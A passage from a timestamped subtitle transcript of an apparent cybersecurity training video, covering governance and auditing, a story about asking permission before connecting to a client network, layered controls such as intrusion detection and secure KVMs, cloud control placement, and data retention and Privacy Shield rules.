talking\nabout standardization.\n\n160\n00:07:31.430 --> 00:07:34.920\nWe don't have these things in\nabundance in our networks.\n\n161\n00:07:34.920 --> 00:07:36.700\nIt's because we have lack of oversight.\n\n162\n00:07:36.700 --> 00:07:37.740\nBad GRC.\n\n163\n00:07:37.740 --> 00:07:41.540\nNo governance, no risk management,\nno active compliance concerns, and\n\n164\n00:07:41.540 --> 00:07:43.450\nwe're not gonna be effective at our jobs.\n\n165\n00:07:43.450 --> 00:07:46.820\nI love to go into networks\nas an auditor and\n\n166\n00:07:46.820 --> 00:07:49.610\nI love to find that policy\nis well documented.\n\n167\n00:07:49.610 --> 00:07:52.510\nI love to find that procedures\nare well documented.\n\n168\n00:07:52.510 --> 00:07:54.339\nThat process is well understood.\n\n169\n00:07:54.339 --> 00:07:55.874\nThat there's clear definition.\n\n170\n00:07:55.874 --> 00:07:57.484\nThat there are role assignments.\n\n171\n00:07:57.484 --> 00:08:00.796\nThat we can randomly reach in audit and\nvalidate But that is or,\n\n172\n00:08:00.796 --> 00:08:04.923\nin some cases is not happening, but\nif there is some exception associated with\n\n173\n00:08:04.923 --> 00:08:09.480\nthat activity not taking place, I wanna\nsee that and I'm happy to see that.\n\n174\n00:08:09.480 --> 00:08:13.700\nI love to find those things, what I hate\nto find is a lot of discussion about what\n\n175\n00:08:13.700 --> 00:08:17.410\nshould be happening and lack of evidence\nthat tells me that it is, right?\n\n176\n00:08:17.410 --> 00:08:19.209\nBecause that's just, unfortunately,\nnot a good state of affairs.\n\n177\n00:08:19.209 --> 00:08:23.487\nBecause that opens the door to\nthe possibility that the bad actors may\n\n178\n00:08:23.487 --> 00:08:27.190\nactually be getting up to no good and\nwe're not aware of it.\n\n179\n00:08:27.190 --> 00:08:30.840\nNo continuous monitoring, excuse me, no\nability to understand through baselining,\n\n180\n00:08:30.840 --> 00:08:33.010\nremediation, and mitigation management.\n\n181\n00:08:33.010 --> 00:08:37.000\nWhether we are running configurations\nthat are acceptable and secure.\n\n182\n00:08:37.000 --> 00:08:40.460\nNo ability to tell whether\nthere's been drift or deltas\n\n183\n00:08:40.460 --> 00:08:44.530\nthat are being implemented and changes\nbeing made from those configurations.\n\n184\n00:08:44.530 --> 00:08:46.030\nThis is really important stuff.\n\n185\n00:08:46.030 --> 00:08:48.810\nThis is how the hackers get in and\ntake advantage.\n\n186\n00:08:48.810 --> 00:08:52.567\nSo for instance, let me tell you a little\nstory, cuz you know I never do that.\n\n187\n00:08:52.567 --> 00:08:54.590\n>> [LAUGH]\n>> So let me tell you a little story.\n\n188\n00:08:54.590 --> 00:08:58.397\nSo I'm working for a customer, sometime\nin the last 12 months, approximately.\n\n189\n00:08:58.397 --> 00:09:01.993\nAnd I'm on site, and I have a need to\nbe able to gain access to the web,\n\n190\n00:09:01.993 --> 00:09:04.111\ngotta check email, do a bunch of stuff.\n\n191\n00:09:04.111 --> 00:09:06.674\nAnd normally not a big deal,\nyou go to most companies,\n\n192\n00:09:06.674 --> 00:09:08.790\nthey've got guest access of some kind.\n\n193\n00:09:08.790 --> 00:09:11.960\nWhether I can plug my laptop\nin directly or I use wireless.\n\n194\n00:09:11.960 --> 00:09:14.970\nIt's really just a question of asking and\nI always make a point of asking,\n\n195\n00:09:14.970 --> 00:09:16.070\nI never want to assume.\n\n196\n00:09:16.070 --> 00:09:19.955\nI don't ever want to be that security\nprofessional that is your nightmare.\n\n197\n00:09:19.955 --> 00:09:22.220\nWhich, I go ahead and\nI flout every rule and\n\n198\n00:09:22.220 --> 00:09:25.210\nevery process you have in place,\neven though I know better.\n\n199\n00:09:25.210 --> 00:09:27.680\nYou're never gonna take what\nI have to say seriously.\n\n200\n00:09:27.680 --> 00:09:30.045\nAnd so I never plug in to a network\nwithout asking permission.\n\n201\n00:09:30.045 --> 00:09:34.620\nI never plug in unless I receive direct\nauthority from somebody in a position to\n\n202\n00:09:34.620 --> 00:09:35.952\ntell me that's okay.\n\n203\n00:09:35.952 --> 00:09:40.250\nBecause I'm sensitive of the fact that,\nnumber one I've got a ton\n\n204\n00:09:40.250 --> 00:09:45.170\nof potentially live hacking tools\nsitting on my system at any one time.\n\n205\n00:09:45.170 --> 00:09:48.530\nI don't want all sorts of bells and alarm\nwhistles going, off forget about sitting\n\n206\n00:09:48.530 --> 00:09:51.685\nin your study late at night and having the\nvoice tell you hey, we updated your stuff?\n\n207\n00:09:51.685 --> 00:09:54.080\n>> [LAUGH]\n>> How about the security instant response\n\n208\n00:09:54.080 --> 00:09:57.651\nteam shows up, wanting to know who the\nhell you are and how you broke in, right?\n\n209\n00:09:57.651 --> 00:09:59.205\n>> [LAUGH] With automatic\nweapons pointed at you, yeah.\n\n210\n00:09:59.205 --> 00:10:00.674\n>> We don't want that to happen, right?\n\n211\n00:10:00.674 --> 00:10:02.731\nSo, we obviously wanna\nbe sensitive to that,\n\n212\n00:10:02.731 --> 00:10:04.960\nwanna make sure that we follow the rules.\n\n213\n00:10:04.960 --> 00:10:07.820\nEspecially if you’re doing consulting\nwork and you’re on site working for\n\n214\n00:10:07.820 --> 00:10:11.180\na customer, always go out of your\nway to ensure that you ask and\n\n215\n00:10:11.180 --> 00:10:14.110\nthat you receive permission to\ndo anything before you do it.\n\n216\n00:10:14.110 --> 00:10:17.380\nSo I always ask, I always say hey\nthis is the deal, I have this stuff,\n\n217\n00:10:17.380 --> 00:10:19.610\nI just want you to know,\nhow do you want to handle this?\n\n218\n00:10:19.610 --> 00:10:21.610\nIf you're not comfortable with\nme plugging in, I get it.\n\n219\n00:10:21.610 --> 00:10:24.585\nI just need a machine, it doesn't have\nto be mine, but I gotta check email.\n\n220\n00:10:24.585 --> 00:10:26.490\nTell me how you want me to that.\n\n221\n00:10:26.490 --> 00:10:27.758\nOkay, no we get it but\n\n222\n00:10:27.758 --> 00:10:31.570\nIf you're gonna plug your machine in,\nthis is what we need to do.\n\n223\n00:10:31.570 --> 00:10:34.800\nWe need to port map your MAC address so\nthat we can validate it to you,\n\n224\n00:10:34.800 --> 00:10:36.735\nwe need to create and exception for you.\n\n225\n00:10:36.735 --> 00:10:42.715\nYou gotta go down the laundry list and\nI go like, damn, wow.\n\n226\n00:10:42.715 --> 00:10:46.800\n[LAUGH] Your security kung fu is strong,\nright?\n\n227\n00:10:46.800 --> 00:10:48.000\nI am in awe.\n\n228\n00:10:48.000 --> 00:10:50.030\nSo, I said, okay, no problem.\n\n229\n00:10:50.030 --> 00:10:52.110\nLet's make this simple for\nboth of us, right?\n\n230\n00:10:52.110 --> 00:10:56.070\nJust, can I hook up to another system and\n\n231\n00:10:56.070 --> 00:10:58.435\njust check my email from one\nof your machines, right?\n\n232\n00:10:58.435 --> 00:11:00.150\n>> Uh-huh.\n>> So here's what we have to do for that.\n\n233\n00:11:00.150 --> 00:11:01.470\nWe have to give you a user account.\n\n234\n00:11:01.470 --> 00:11:03.180\nYou can see I'm listening, I'm like.\n\n235\n00:11:03.180 --> 00:11:05.560\n>> [LAUGH]\n>> I just at that point I'm like,\n\n236\n00:11:05.560 --> 00:11:06.630\nI'm gonna go out in the parking lot.\n\n237\n00:11:06.630 --> 00:11:07.890\nI'm gonna go get my phone.\n\n238\n00:11:07.890 --> 00:11:09.810\nCuz the whole thing was I\nleft my phone in the car.\n\n239\n00:11:09.810 --> 00:11:11.190\n>> Okay.\n>> Otherwise it would have been not a big\n\n240\n00:11:11.190 --> 00:11:11.780\ndeal\n>> Right.\n\n241\n00:11:11.780 --> 00:11:14.550\n>> I'm like, all right, I'm going out,\nI'm gonna go take a break and\n\n242\n00:11:14.550 --> 00:11:16.075\nI'm gonna go check my\nemail in the parking lot.\n\n243\n00:11:16.075 --> 00:11:18.260\nBecause, I appreciate it,\nand I was serious.\n\n244\n00:11:18.260 --> 00:11:21.670\nI said, you are telling me all the stuff\nI wanna hear, but, at the same time,\n\n245\n00:11:21.670 --> 00:11:23.465\nyou're making my life miserable.\n\n246\n00:11:23.465 --> 00:11:23.972\n>> [LAUGH]\n>> Right,\n\n247\n00:11:23.972 --> 00:11:25.720\nbecause all I wanna do is check email.\n\n248\n00:11:25.720 --> 00:11:27.940\nAnd I don't want to go through\nthe 25 minutes it's gonna take for\n\n249\n00:11:27.940 --> 00:11:30.520\nyou to make a user account just so\nI can log in as a guest.\n\n250\n00:11:30.520 --> 00:11:31.970\nIt's just not worth your time.\n\n251\n00:11:31.970 --> 00:11:36.910\nSo you want to make sure that you've got\na realistic response to every problem.\n\n252\n00:11:36.910 --> 00:11:38.980\nThis guy had it nailed down lock,\nstock, and\n\n253\n00:11:38.980 --> 00:11:41.280\nbarrel, awesome response to the questions.\n\n254\n00:11:41.280 --> 00:11:44.820\nBut the reality was in that\nsituation was overkill, right?\n\n255\n00:11:44.820 --> 00:11:47.240\nI mean, it was way too much for\nme to be able to do what I wanted to do.\n\n256\n00:11:47.240 --> 00:11:51.670\nSo I parachuted out, went got\na Starbucks espresso, and I was happy.\n\n257\n00:11:51.670 --> 00:11:55.960\nI got my coffee and I got my email and\neverybody lived a very, very fruitful and\n\n258\n00:11:55.960 --> 00:11:58.840\nlong existence practicing security,\nend of story.\n\n259\n00:11:58.840 --> 00:12:00.500\nSo what about the network layer, right?\n\n260\n00:12:00.500 --> 00:12:01.730\nWhat about NIDs and HIDs?\n\n261\n00:12:01.730 --> 00:12:03.190\nWhat about NIPS, what about WHIPS?\n\n262\n00:12:03.190 --> 00:12:05.910\nWhat about chains what about all\nthis stuff that goes into that.\n\n263\n00:12:05.910 --> 00:12:07.460\nWe don't have anything\ncalled chains by the way.\n\n264\n00:12:07.460 --> 00:12:10.650\nActually we do, IP chains,\nthe firewall right in Linux.\n\n265\n00:12:10.650 --> 00:12:12.360\nThose are the good old days by the way,\nright?\n\n266\n00:12:12.360 --> 00:12:15.925\nBut what about network intrusion\ndetection, host based intrusion\n\n267\n00:12:15.925 --> 00:12:19.690\nprevention, wireless based intrusion\nprevention and or detection?\n\n268\n00:12:19.690 --> 00:12:23.830\nNIDS, NIPS, HIDS, HIPS,\nWHIPS, right and or WIDS.\n\n269\n00:12:23.830 --> 00:12:25.841\nYou can feel free to throw any\nanother acronyms in there you would\n\n270\n00:12:25.841 --> 00:12:26.481\nlike along the way.\n\n271\n00:12:26.481 --> 00:12:30.639\nCertainly any of that kind of stuff\nQOS it, quality service management and\n\n272\n00:12:30.639 --> 00:12:34.108\nbandwidth tagging or\npacket tagging in the bandwidth layer.\n\n273\n00:12:34.108 --> 00:12:35.080\nWhat about DNSSEC?\n\n274\n00:12:35.080 --> 00:12:37.570\nMike mentioned this and\ndid a great explanation for\n\n275\n00:12:37.570 --> 00:12:39.110\nus on this in a prior episode.\n\n276\n00:12:39.110 --> 00:12:40.780\nAll these things that\nfall into this layer.\n\n277\n00:12:40.780 --> 00:12:42.100\nWhat about the use of OAuth?\n\n278\n00:12:42.100 --> 00:12:46.310\nI mentioned OAuth, I mentioned\nWS Federation, I mentioned XACML,\n\n279\n00:12:46.310 --> 00:12:49.860\nXAML, as open standards and\nprotocols that are useful for\n\n280\n00:12:49.860 --> 00:12:51.950\nus to be able to create secure solutions.\n\n281\n00:12:51.950 --> 00:12:53.190\nAll these will be here.\n\n282\n00:12:53.190 --> 00:12:56.075\nTrusted computing,\nhardware and software, right?\n\n283\n00:12:56.075 --> 00:12:59.040\nWanna be thinking about\nbuying from trusted vendors.\n\n284\n00:12:59.040 --> 00:13:02.730\nLooking at something like the common\ncriteria to be able to assess\n\n285\n00:13:02.730 --> 00:13:04.930\na product and/or a system, and\n\n286\n00:13:04.930 --> 00:13:09.730\nthen understand how it's evaluated with an\nEAL, an Evaluation Assurance Level rating.\n\n287\n00:13:09.730 --> 00:13:12.320\nThat we could then stand on, that gives\nus a protection profile that we can\n\n288\n00:13:12.320 --> 00:13:14.330\nunderstand and apply, so things like that.\n\n289\n00:13:14.330 --> 00:13:17.450\nAgain, the use of standardized\nAPIs that are not black boxed\n\n290\n00:13:17.450 --> 00:13:18.810\nwould also be helpful here.\n\n291\n00:13:18.810 --> 00:13:22.080\nComputers and storage, they're\nthinking about host-based firewalls,\n\n292\n00:13:22.080 --> 00:13:26.430\nthinking about integrity and\nfile solutions, log monitoring.\n\n293\n00:13:26.430 --> 00:13:30.380\nI showed you sigverif in one of our prior\nepisodes, a way to check on a Windows\n\n294\n00:13:30.380 --> 00:13:34.640\nmachine if we have comprised DLLs,\nany of that kind of stuff.\n\n295\n00:13:34.640 --> 00:13:37.370\nThe use of encryption is always good\nto throw in just about anywhere.\n\n296\n00:13:37.370 --> 00:13:38.550\nWhat about at the physical layer?\n\n297\n00:13:38.550 --> 00:13:40.373\nI often refer to this as guards,\nguns, and gates, right?\n\n298\n00:13:40.373 --> 00:13:44.577\nThe triple-Gs, so thinking about all\nthe physical security measures we're\n\n299\n00:13:44.577 --> 00:13:47.505\ngonna put in place to prevent\npeople from walking in and\n\n300\n00:13:47.505 --> 00:13:50.192\ngaining direct proximity\naccess to our systems.\n\n301\n00:13:50.192 --> 00:13:55.110\nSecure KVMs, you ever seen or\nused a secure KVM, by the way?\n\n302\n00:13:55.110 --> 00:13:55.630\n>> No, I have not.\n\n303\n00:13:55.630 --> 00:13:57.510\n>> You've seen, I'm sure,\nnormal KVMs, right?\n\n304\n00:13:57.510 --> 00:14:00.550\nSo the main difference is,\nwe blindfold you and\n\n305\n00:14:00.550 --> 00:14:03.810\nwe turn you around five times, and then\nwe don't tell you what you're room in,\n\n306\n00:14:03.810 --> 00:14:05.870\nyou have to find the KVM,\nthen it's secure.\n\n307\n00:14:05.870 --> 00:14:07.710\nOtherwise it's essentially the same thing.\n\n308\n00:14:07.710 --> 00:14:10.740\nNow I joke about this, but the reality is,\nthere is such a thing as secure KVMs.\n\n309\n00:14:10.740 --> 00:14:12.520\nI talk about this with students all\nthe time, they're like, come on,\n\n310\n00:14:12.520 --> 00:14:13.550\nyou're kidding us, right?\n\n311\n00:14:13.550 --> 00:14:16.690\nNo, absolutely,\nyou can actually buy secure KVMs.\n\n312\n00:14:16.690 --> 00:14:19.730\nThey are tamper hardened,\ntamper resistant, tamper proofed.\n\n313\n00:14:19.730 --> 00:14:22.990\nThey have essentially Faraday cages,\nso they are not gonna allow for\n\n314\n00:14:22.990 --> 00:14:23.880\nany emanation.\n\n315\n00:14:23.880 --> 00:14:27.700\nTotal channel isolation, so every channel\nin the KVM is isolated from every other\n\n316\n00:14:27.700 --> 00:14:30.250\none in a multi-tenant and/or\nmulti-system environment.\n\n317\n00:14:30.250 --> 00:14:33.280\nAnd they've got the tampers\nresistant seals on the front.\n\n318\n00:14:33.280 --> 00:14:35.150\nYou open them up,\nthey essentially self destruct.\n\n319\n00:14:35.150 --> 00:14:37.430\nYou can't get in and\ntap into the channels.\n\n320\n00:14:37.430 --> 00:14:40.080\nEverything is push button only,\nwhich means no remote access.\n\n321\n00:14:40.080 --> 00:14:43.090\nYou gotta be physically in\nfront of the KVM to use it.\n\n322\n00:14:43.090 --> 00:14:44.610\nAnd as a result of that,\n\n323\n00:14:44.610 --> 00:14:48.110\nwhen we layer that in with all the other\nphysical controls, with the guards, guns,\n\n324\n00:14:48.110 --> 00:14:50.940\nand gates, it's a multi-layered\ndefense in depth strategy.\n\n325\n00:14:50.940 --> 00:14:54.150\nCuz you can't use this\nthing outside of the stack,\n\n326\n00:14:54.150 --> 00:14:58.580\noutside of the rack inside the data\ncenter, you gotta be standing there.\n\n327\n00:14:58.580 --> 00:15:03.350\nAnd so these are interesting devices but\nwe go to this level if we need to process,\n\n328\n00:15:03.350 --> 00:15:05.000\nisolate, and secure those transmissions.\n\n329\n00:15:05.000 --> 00:15:07.060\nSo you could be standing right\nnext to one of these things.\n\n330\n00:15:07.060 --> 00:15:08.230\nYou wouldn't be able to pick up a signal,\nnothing.\n\n331\n00:15:08.230 --> 00:15:08.736\n>> Right.\n\n332\n00:15:08.736 --> 00:15:10.810\n>> Your standard KVMs?\n\n333\n00:15:10.810 --> 00:15:11.880\nThey're just noisy as hell.\n\n334\n00:15:11.880 --> 00:15:14.630\nThey emanate all sorts of stuff,\nas most systems do.\n\n335\n00:15:14.630 --> 00:15:17.500\nYou could stand within about 20 feet\nof a standard KVM with the right\n\n336\n00:15:17.500 --> 00:15:20.880\nkind of monitoring gear and pull all the\ndata transmissions off in real time and\n\n337\n00:15:20.880 --> 00:15:21.800\nsee what's happening.\n\n338\n00:15:21.800 --> 00:15:22.400\n>> Right.\n>> Right?\n\n339\n00:15:22.400 --> 00:15:26.660\nBut because the Faraday caging and the\nFaraday protection, which is the copper\n\n340\n00:15:26.660 --> 00:15:30.950\nwire mesh that essentially absorbs all\nthe electromagnetic emanating radiation,\n\n341\n00:15:30.950 --> 00:15:31.990\nwe prevent that all from happening.\n\n342\n00:15:31.990 --> 00:15:32.580\n>> So that's cool.\n\n343\n00:15:32.580 --> 00:15:33.300\n>> It's actually kinda cool.\n\n344\n00:15:33.300 --> 00:15:35.380\n>> It is.\n>> Yeah, I just made that up,\n\n345\n00:15:35.380 --> 00:15:35.936\nas a matter of fact.\n\n346\n00:15:35.936 --> 00:15:36.910\n>> [LAUGH]\n>> So actually, really cool.\n\n347\n00:15:36.910 --> 00:15:38.960\nNo, I'm not making it,\nit's really serious, go out and Google,\n\n348\n00:15:38.960 --> 00:15:40.330\nyou could find secured KVMs.\n\n349\n00:15:40.330 --> 00:15:44.100\nThey're available on a lot of the standard\nwebsites you go out to buy equipment from\n\n350\n00:15:44.100 --> 00:15:45.160\nand things like that.\n\n351\n00:15:45.160 --> 00:15:46.745\nYou can find them out there,\nthey are more expensive.\n\n352\n00:15:46.745 --> 00:15:48.590\nI use them and\nsee them all the time when I go out and\n\n353\n00:15:48.590 --> 00:15:50.345\ndo work on the military bases,\nfor instance.\n\n354\n00:15:50.345 --> 00:15:52.581\n>> Okay.\n>> They've got them on the class networks\n\n355\n00:15:52.581 --> 00:15:56.039\nright next to, as I said, the mouse\npads that are certified as class only.\n\n356\n00:15:56.039 --> 00:15:57.545\nYou'll see secure KVM sitting there.\n\n357\n00:15:57.545 --> 00:16:00.995\nAnd it's interesting, because you actually\ngot two complete sets of infrastructure in\n\n358\n00:16:00.995 --> 00:16:02.130\na lot of these systems.\n\n359\n00:16:02.130 --> 00:16:05.125\nThey run both class,\nclassified, and unclass.\n\n360\n00:16:05.125 --> 00:16:07.110\nUnclassified networks side by side.\n\n361\n00:16:07.110 --> 00:16:10.750\nSo you've got SIPRNet, NIPRNet, all the\nvarious things and so in a lot of these\n\n362\n00:16:10.750 --> 00:16:15.600\nsystems, you got two terminals, one for\nclassified only, one for unclassified.\n\n363\n00:16:15.600 --> 00:16:19.200\nThey sit side by side, you got two\ncomplete sets of gear on the desk.\n\n364\n00:16:19.200 --> 00:16:22.640\nOne is red, one is green and\ndepending on which one you're using,\n\n365\n00:16:22.640 --> 00:16:24.230\nyou're essentially on one or\nthe other network.\n\n366\n00:16:24.230 --> 00:16:29.210\nSo, lot of times you'll have a secure KVM\nthat connects the classified stuff up, and\n\n367\n00:16:29.210 --> 00:16:30.985\nthen a separate one that does the unclass,\n\n368\n00:16:30.985 --> 00:16:32.730\nbecause they don't wanna\ncross the two strips.\n\n369\n00:16:32.730 --> 00:16:34.270\n>> That makes sense\n>> So, that's kinda interesting when you\n\n370\n00:16:34.270 --> 00:16:36.460\nsee all of this\n>> I'd want that kind of a budget to have\n\n371\n00:16:36.460 --> 00:16:37.790\nfigure home theater.\n\n372\n00:16:37.790 --> 00:16:40.660\nI'm gonna have the secure\ntheater over here.\n\n373\n00:16:40.660 --> 00:16:42.790\nI'm gonna the unsecure theater over here.\n\n374\n00:16:42.790 --> 00:16:44.210\nExcept for projectors.\n\n375\n00:16:44.210 --> 00:16:46.980\nConcessions, the whole nine yards.\n\n376\n00:16:46.980 --> 00:16:48.480\nSo all that stuff, it'll all be there.\n\n377\n00:16:48.480 --> 00:16:49.910\n>> So let's think about this for a minute.\n\n378\n00:16:49.910 --> 00:16:51.872\nWhere do we place, allocating aside,\n\n379\n00:16:51.872 --> 00:16:55.350\nthis intro to our next topic,\nwhere do we place security controls?\n\n380\n00:16:55.350 --> 00:16:57.915\nWe're talking about the use of secure and\n\n381\n00:16:57.915 --> 00:17:00.900\nthe fact that we may need to\nliterally separate everything.\n\n382\n00:17:00.900 --> 00:17:04.160\nThat's a clear physical demarcation\nfrom a controls perspective.\n\n383\n00:17:04.160 --> 00:17:06.380\nWhere are we gonna place\nsecurity controls in the cloud?\n\n384\n00:17:06.380 --> 00:17:09.640\nI mean, the cloud, by its very nature,\nis ubiquitous, it's all around us, right?\n\n385\n00:17:09.640 --> 00:17:11.520\nSo how are we gonna place controls,\n\n386\n00:17:11.520 --> 00:17:14.300\nwhere are we gonna put countermeasures\nin places that they can impact us?\n\n387\n00:17:14.300 --> 00:17:16.570\nI mean, that's gonna be\nsomething to think about, right?\n\n388\n00:17:16.570 --> 00:17:18.020\nIs it at the data center?\n\n389\n00:17:18.020 --> 00:17:20.410\nIs it at the client's end point?\n\n390\n00:17:20.410 --> 00:17:21.720\nOur end point as a customer.\n\n391\n00:17:21.720 --> 00:17:23.590\nIs it at the cloud based data center?\n\n392\n00:17:23.590 --> 00:17:24.410\nIs it in between?\n\n393\n00:17:24.410 --> 00:17:27.980\nIt may be all of these, right,\nbut we have to think about that.\n\n394\n00:17:27.980 --> 00:17:33.230\nIf I'm sitting at Starbucks, and\nI am using the cloud is there a control or\n\n395\n00:17:33.230 --> 00:17:35.470\ncountermeasure that's in\nmy place on my machine?\n\n396\n00:17:35.470 --> 00:17:39.650\nSitting in the parking lot or\nin the cafe in real time?\n\n397\n00:17:39.650 --> 00:17:40.510\nI mean there may not be.\n\n398\n00:17:40.510 --> 00:17:41.690\nI don't know.\n\n399\n00:17:41.690 --> 00:17:43.720\nI connect up,\nI spend a lot of time on the road.\n\n400\n00:17:43.720 --> 00:17:45.620\nI work at Starbucks quite a bit.\n\n401\n00:17:45.620 --> 00:17:47.877\nThey've actually endowed\na chair at the Starbucks by me.\n\n402\n00:17:47.877 --> 00:17:50.855\n[CROSSTALK] Yes, absolutely,\nit has my name on it,\n\n403\n00:17:50.855 --> 00:17:54.964\nand I have a little gold star there,\nand it says, it's where he sits.\n\n404\n00:17:54.964 --> 00:17:57.980\n>> You've got a lot of espressos.\n\n405\n00:17:57.980 --> 00:18:01.040\n>> I have, I am the master\n>> [LAUGH]\n\n406\n00:18:01.040 --> 00:18:02.550\n>> That's what I'm gonna put on my cards\n\n407\n00:18:02.550 --> 00:18:03.380\nfrom now on, right?\n\n408\n00:18:03.380 --> 00:18:06.751\nInstead of DM, Decision Maker,\nit'll be DM, Master.\n\n409\n00:18:06.751 --> 00:18:07.890\n>> I like it.\n>> So,\n\n410\n00:18:07.890 --> 00:18:09.580\nwhere do we put those controls, right?\n\n411\n00:18:09.580 --> 00:18:10.570\nWhere do we think about it?\n\n412\n00:18:10.570 --> 00:18:13.700\nIs there, when I connect through the\nrouter at Starbucks, for instance, right,\n\n413\n00:18:13.700 --> 00:18:14.790\nthe wireless gateway.\n\n414\n00:18:14.790 --> 00:18:17.140\nAnd do I know what kind of\nsecurity is taking place there?\n\n415\n00:18:17.140 --> 00:18:18.380\nI mean, I know in theory, right?\n\n416\n00:18:18.380 --> 00:18:20.210\nThere's filtering, there's a router,\n\n417\n00:18:20.210 --> 00:18:22.500\nthere's a firewall function\nbuilt into that device.\n\n418\n00:18:22.500 --> 00:18:24.180\nDo I know how it's configured?\n\n419\n00:18:24.180 --> 00:18:27.090\nProbably not, I mean, not unless I'm\ntold or not unless I go in there and\n\n420\n00:18:27.090 --> 00:18:28.000\nI poke around.\n\n421\n00:18:28.000 --> 00:18:28.600\nRight?\nBut\n\n422\n00:18:28.600 --> 00:18:31.150\nthe reality is there's multiple layers\nwhere we will have to put those\n\n423\n00:18:31.150 --> 00:18:32.500\ncontrols and protections.\n\n424\n00:18:32.500 --> 00:18:34.700\nAnd it's more extensive than\nit would be outside the Cloud,\n\n425\n00:18:34.700 --> 00:18:39.070\nbecause we now have to worry about,\nnot just the data center itself,\n\n426\n00:18:39.070 --> 00:18:41.240\nbut we have to worry about\nthe intervening transition medium.\n\n427\n00:18:41.240 --> 00:18:44.370\nWe have to worry about the end point, and\nwe've always had to worry about these\n\n428\n00:18:44.370 --> 00:18:47.970\nthings, but we haven't really taken\nas much time, I think, in the cloud,\n\n429\n00:18:47.970 --> 00:18:49.460\nto think about how to secure them.\n\n430\n00:18:49.460 --> 00:18:52.840\nBecause we're not using VPNs traditionally\nanymore to go into the cloud,\n\n431\n00:18:52.840 --> 00:18:56.140\nwe're just simply opening up a web\nbrowser, pointing at an API.\n\n432\n00:18:56.140 --> 00:19:00.418\nEssentially a destination address,\nlogging in and assuming it's all secure,\n\n433\n00:19:00.418 --> 00:19:04.220\nwhere before I.T. would take time to\nconfigure a VPN, create a secure and\n\n434\n00:19:04.220 --> 00:19:08.540\ncryptic tunnel and force communication\nto be encrypted and force authentication\n\n435\n00:19:08.540 --> 00:19:12.990\nto occur and force you to come in\nthrough a known access point, monitor\n\n436\n00:19:12.990 --> 00:19:17.180\nthat transition, limited you to certain\nsubnets when you get in on the inside.\n\n437\n00:19:17.180 --> 00:19:19.070\nWe're not doing any of that traditionally.\n\n438\n00:19:19.070 --> 00:19:19.940\nWe're just simply saying, hey.\n\n439\n00:19:19.940 --> 00:19:22.220\nOpen the application or web browser.\n\n440\n00:19:22.220 --> 00:19:25.220\nGo to this URL or use this API to connect.\n\n441\n00:19:25.220 --> 00:19:27.110\nAnd then everything else\njust kinda happens.\n\n442\n00:19:27.110 --> 00:19:29.620\nSo we've taken a lot of\nthat forcefulness and\n\n443\n00:19:29.620 --> 00:19:34.050\nthat focus away from the customer,\nand really shifted it to the provider.\n\n444\n00:19:34.050 --> 00:19:35.210\nI'm not saying it's not happening,\n\n445\n00:19:35.210 --> 00:19:38.120\nI'm just pointing out that a lot of\nthe controls that we would normally be\n\n446\n00:19:38.120 --> 00:19:41.140\nresponsible for\nare now they're with somebody else,\n\n447\n00:19:41.140 --> 00:19:45.500\nand we have to think about that as well\nand understand that it may still very well\n\n448\n00:19:45.500 --> 00:19:49.650\nbe the same thing but the reality of whose\npulling the levers may be very different.\n\n449\n00:19:49.650 --> 00:19:52.740\nAnd we may not understand as a result\nof that, what the opportunities, but\n\n450\n00:19:52.740 --> 00:19:54.810\nalso what the liabilities are.\n\n451\n00:19:54.810 --> 00:19:55.710\nBe something to consider.\n\n452\n00:19:55.710 --> 00:19:58.550\nWe talked about the fact\nthat there's vendor chain or\n\n453\n00:19:58.550 --> 00:20:01.690\nsupply chain risk here,\nthat we have no visibility into either.\n\n454\n00:20:01.690 --> 00:20:03.890\nThis is a really big concern for us.\n\n455\n00:20:03.890 --> 00:20:08.390\nMaking sure data protection, back-ups and\nretention periods are being managed.\n\n456\n00:20:08.390 --> 00:20:09.210\nBy the way, so for\n\n457\n00:20:09.210 --> 00:20:12.060\ninstance, I'll just give you a quick\naside here, do you know how long under\n\n458\n00:20:12.060 --> 00:20:15.460\nfederal law of the United States you\nhave to keep business related data for?\n\n459\n00:20:15.460 --> 00:20:17.270\n>> I'm going to guess seven years.\n\n460\n00:20:17.270 --> 00:20:19.890\n>> Traditional answer, right,\nseven years, because tax purposes.\n\n461\n00:20:19.890 --> 00:20:21.360\nWhat about in Germany?\n\n462\n00:20:21.360 --> 00:20:22.280\n>> That I don't know.\n\n463\n00:20:22.280 --> 00:20:22.860\n>> Ten years.\n\n464\n00:20:22.860 --> 00:20:24.748\n>> Ten?\n>> Yes, under U.S. Federal Law.\n\n465\n00:20:24.748 --> 00:20:28.740\n[INAUDIBLE]\n>> But on your journey log, ten years for\n\n466\n00:20:28.740 --> 00:20:30.890\nmost business records,\nyou have to keep stuff longer.\n\n467\n00:20:30.890 --> 00:20:34.770\nNow in general, European protections,\nespecially within the EU tend to be more\n\n468\n00:20:34.770 --> 00:20:39.080\nstringent, certainly in the area of\nprivacy with regards to the use of\n\n469\n00:20:39.080 --> 00:20:42.410\ncloud communications and\nprivacy related concerns.\n\n470\n00:20:42.410 --> 00:20:45.450\nThey have been far and\naway ahead of us in the United States and\n\n471\n00:20:45.450 --> 00:20:48.880\ncontinue to be with the advent\nof new laws that are coming out.\n\n472\n00:20:48.880 --> 00:20:52.710\nBut the reality is, those laws and\nthose standards vary by country, and yet\n\n473\n00:20:52.710 --> 00:20:55.320\nin the Cloud we don't recognise\nthose borders, right?\n\n474\n00:20:55.320 --> 00:20:59.990\nIf I'm a business in the U.S. doing\nbusiness, and I'm dealing with European\n\n475\n00:20:59.990 --> 00:21:04.980\nunion information from\nessentially a citizen of\n\n476\n00:21:04.980 --> 00:21:10.100\nany of the EU countries under what used to\nbe called the Safe Harbor requirements,\n\n477\n00:21:10.100 --> 00:21:15.560\nthat's been gutted at the end of 2015,\nredone early in 2016.\n\n478\n00:21:15.560 --> 00:21:18.620\nNow commonly refered to\nas privacy shield laws.\n\n479\n00:21:18.620 --> 00:21:22.870\nEssentially a revamp,\na reboot of the Safe Harbor requirements.\n\n480\n00:21:22.870 --> 00:21:27.990\nI, as a company, have to ascribe to\na higher level of data protection and\n\n481\n00:21:27.990 --> 00:21:30.270\ninformation management\nthat I would in the US,\n\n482\n00:21:30.270 --> 00:21:34.710\nif I didn't manage those same\nnationals from the EU and their data.\n\n483\n00:21:34.710 --> 00:21:36.810\nAnd if I don't do that,\nI'm not allowed to do business there.\n\n484\n00:21:36.810 --> 00:21:39.020\nI have to follow another\nmuch more stricter,\n\n485\n00:21:39.020 --> 00:21:42.170\nmuch more stringent requirements\nwhich protects their data.\n\n486\n00:21:42.170 --> 00:21:43.940\nBut interestingly enough,\n\n487\n00:21:43.940 --> 00:21:46.820\nI 